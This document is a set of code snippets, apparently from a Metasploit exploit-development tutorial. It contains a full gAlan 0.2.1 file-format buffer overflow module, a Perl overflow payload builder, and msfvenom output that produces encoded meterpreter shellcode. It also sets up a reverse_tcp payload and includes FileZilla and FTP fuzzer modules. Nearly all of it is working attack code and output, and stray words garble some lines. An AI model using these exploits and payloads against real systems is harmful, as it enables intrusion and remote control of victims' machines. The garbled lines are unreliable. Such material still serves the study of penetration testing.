["```\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\nRank = ExcellentRanking\ninclude Msf::Exploit::Remote::Tcp\ninclude Msf::Exploit::EXE\n\n```", "```\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => '',\n'Description')\n\n```", "```\nregister_options(\n[\nOpt::RPORT(7777),\n], self.class)\nend\n\n```", "```\ndef exploit\nconnect()\nsock.put(payload.encoded)\nhandler()\ndisconnect()\nend\n\n```", "```\nroot@bt:~# msfvenom -h\nUsage: /opt/framework/msf3/msfvenom [options]\nOptions:\n-p, --payload [payload] Payload to use. Specify a '-' or stdin to use custom..\n-l, --list [module_type] List a module type example: payloads, encoders, nops, all\n-n, --nopsled [length] Prepend a nopsled of [length] size on to the payload\n-f, --format [format] Format to output results in: raw, ruby, rb, perl, pl, bash..\n-e, --encoder [encoder] The encoder to use\n-a, --arch [architecture] The architecture to use\n-s, --space [length] The maximum size of the resulting payload\n-b, --bad-chars [list] The list of characters to avoid example: '\\x00\\xff'\n-i, --iterations [count] The number of times to encode the payload\n-c, --add-code [path] Specify an additional win32 shellcode file to include\n-x, --template [path] Specify a custom executable file to use as a template\n-k, --keep Preserve the template behavior and inject the payload as..\n-h, --help Show this message \n\n```", "```\nroot@bt:~# msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -b '\\x00' -i 3\n[*] x86/shikata_ga_nai succeeded with size 325 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 352 (iteration=2)\n[*] x86/shikata_ga_nai succeeded with size 379 (iteration=3)\nbuf =\n\"\\xdb\\xdb\\xbe\\x0a\\x3a\\xfc\\x6d\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\" +\n\"\\xb1\\x52\\x31\\x72\\x18\\x83\\xea\\xfc\\x03\\x72\\x1e\\xd8\\x09\\xb6\" +\n\"\\xce\\xc5\\x86\\x6d\\x1a\\xa8\\xd8\\x88\\xa8\\xbc\\x51\\x64\\xe5\\xf2\" +\n\"\\xd1\\xb7\\x80\\xed\\x66\\x72\\x6e\\x0d\\x1c\\x68\\x6a\\xae\\xcd\\x0e\" +\n\"\\x33\\x90\\x1d\\x73\\x82\\xd8\\xd7\\xe0\\x87\\x76\\xbd\\x25\\xf4\\x23\" +\n\"\\x4d\\x38\\xc2\\xc3\\xe9\\xa1\\x7e\\x31\\xc5\\xe4\\x84\\x2a\\x3b\\x37\" +\n\"\\xb3\\xd6\\x13\\xc4\\x09\\x89\\xd0\\x95\\x21\\x10\\x6b\\x83\\x94\\x3d\" + \n```", "```\n$magic = \"Mjik\";\n$addr = 0x7E429353; # JMP ESP @ user32,dll\n$filename = \"bof.galan\";\n$retaddr = pack('l', $addr);\n$payload = $magic . $retaddr x 258 . \"\\x90\" x 256 . $shellcode;\n\n```", "```\nroot@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb\nUsage: pattern_create.rb length [set a] [set b] [set c]\nroot@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb 5000 \n```", "```\nroot@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x234abc 5000\n1032 \n```", "```\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\ninclude Msf::Exploit::FILEFORMAT\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'gAlan 0.2.1 Buffer Overflow Exploit',\n'Description' => %q{\nThis module exploits a stack overflow in gAlan 0.2.1\nBy creating a specially crafted galan file, an attacker may be able\nto execute arbitrary code.\n},\n'License' => MSF_LICENSE,\n'Author' => [ 'original by Jeremy Brown' ],\n'Version' => '$Revision: 7724 $',\n'References' =>\n[\n[ 'URL', 'http://www.exploit-db.com/exploits/10339' ],\n],\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'process',\n},\n'Payload' =>\n{\n'Space' => 1000,\n'BadChars' => \"\\x00\\x0a\\x0d\\x20\\x0c\\x0b\\x09\",\n'StackAdjustment' => -3500,\nMetasploit moduleworking},\n'Platform' => 'win',\n'Targets' =>\n[\n[ 'Windows XP Universal', { 'Ret' => 0x100175D0} ], # 0x100175D0 call esi @ glib-1_3\n],\n'Privileged' => false,\n'DefaultTarget' => 0))\nregister_options(\n[\nOptString.new('FILENAME', [ false, 'The file name.', 'evil.galan']),\n], self.class)\nend\n\n```", "```\nsploit << rand_text_alpha_upper(1028);\nsploit << [target.ret].pack('V');\n\n```", "```\nsploit << \"\\x90\" * 45\n\n```", "```\nsploit << payload.encoded\n\n```", "```\ndef exploit\nsploit = \"Mjik\"\nsploit << rand_text_alpha_upper(1028)\nsploit << [target.ret].pack('V')\nsploit << \"\\x90\" * 45\nsploit << payload.encoded\ngalan = sploit\nprint_status(\"Creating '#{datastore['FILENAME']}' file ...\")\nfile_create(galan)\nend \n```", "```\nmsf > use exploit/windows/fileformat/galan_fileformat_bof\nmsf exploit(galan_fileformat_bof) > set PAYLOAD windows/meterpreter/reverse_tcp\nmsf exploit(galan_fileformat_bof) > set LHOST 192.168.56.101\nmsf exploit(galan_fileformat_bof) > exploit \n```", "```\nmsf > use auxiliary/fuzzers/ftp/client_ftp\nmsf auxiliary(client_ftp) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nCYCLIC true yes Use Cyclic pattern instead..\nENDSIZE 200000 yes Max Fuzzing string size.\nERROR false yes Reply with error codes only\nEXTRALINE true yes Add extra CRLF's in..\nFUZZCMDS LIST.. yes Comma separated list..\nRESET true yes Reset fuzzing values after..\nSRVHOST 0.0.0.0 yes The local host to listen on.\nSRVPORT 21 yes The local port to listen on.\nSSL false no Negotiate SSL for incoming..\nSSLVersion SSL3 no Specify the version of SSL..\nSTARTSIZE 1000 yes Fuzzing string startsize.\nSTEPSIZE 1000 yes Increment fuzzing string.. \n```", "```\nmsf auxiliary(client_ftp) > run\n[*] Server started.\n[*] Client connected : 192.168.56.102\n[*] - Set up active data port 20\n[*] Sending response for 'WELCOME' command, arg\n[*] Sending response for 'USER' command, arg test\n[*] Sending response for 'PASS' command, arg test\n[*] - Set up active data port 16011\n[*] Sending response for 'PORT' command, arg 192,168,0,188,62,139\n[*] Handling NLST command\n[*] - Establishing active data connection\n[*] - Data connection set up\n[*] * Fuzzing response for LIST, payload length 1000\n[*] (i) Setting next payload size to 2000\n[*] - Sending directory list via data connection \n```", "```\nrequire 'msf/core'\nclass Metasploit3 < Msf::Auxiliary\ninclude Msf::Auxiliary::Scanner\ndef initialize\nsuper(\n'Name' => 'FileZilla Fuzzer',\n'Version' => '$Revision: 1 $',\n'Description' => 'Filezilla FTP fuzzer',\n'Author' => 'Abhinav_singh',\n'License' => MSF_LICENSE\n)\nregister_options( [\nOpt::RPORT(14147),\nOptInt.new('STEPSIZE', [ false, \"Increase string size each iteration with this number of chars\",10]),\nOptInt.new('DELAY', [ false, \"Delay between connections\",0.5]),\nOptInt.new('STARTSIZE', [ false, \"Fuzzing string startsize\",10]),\nOptInt.new('ENDSIZE', [ false, \"Fuzzing string endsize\",20000])\n], self.class)\nend\n\n```", "```\ndef run_host(ip)\nudp_sock = Rex::Socket::Udp.create(\n'Context' =>\n{\n'Msf' => framework,\n'MsfExploit' => self,\n}\n)\nstartsize = datastore['STARTSIZE'] # fuzz data size to begin with\ncount = datastore['STEPSIZE'] # Set count increment\nsimple FileZilla FTP fuzzerwritingwhile count < 10000 # While the count is under 10000 run\nevil = \"A\" * count # Set a number of \"A\"s equal to count\npkt = \"\\x00\\x02\" + \"\\x41\" + \"\\x00\" + evil + \"\\x00\" # Define the payload\nudp_sock.sendto(pkt, ip, datastore['RPORT']) # Send the packet\nprint_status(\"Sending: #{evil}\")\nresp = udp_sock.get(1) # Capture the response\ncount += 100 # Increase count by 10, and loop\nend\nend\nend \n```", "```\nmsf > use auxiliary/fuzzers/ftp/filezilla_fuzzer\nmsf auxiliary(filezilla_fuzzer) > show options\nModule options (auxiliary/fuzzers/ftp/filezilla_fuzzer):\nName Current Setting Required Description\n---- --------------- -------- -----------\nDELAY 0.5 no Delay between..\nENDSIZE 20000 no Fuzzing string endsize\nRHOSTS yes The target address\nRPORT 14147 yes The target port\nSTARTSIZE 10 no Fuzzing string startsize\nSTEPSIZE 10 no Increase string size.. \n```", "```\nmsf auxiliary(filezilla_fuzzer) > set RHOSTS 192.168.56.1\nRHOSTS => 192.168.56.1\nmsf auxiliary(filezilla_fuzzer) > run\n[*] Sending: AAAAAAAAAA\n[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \n```"]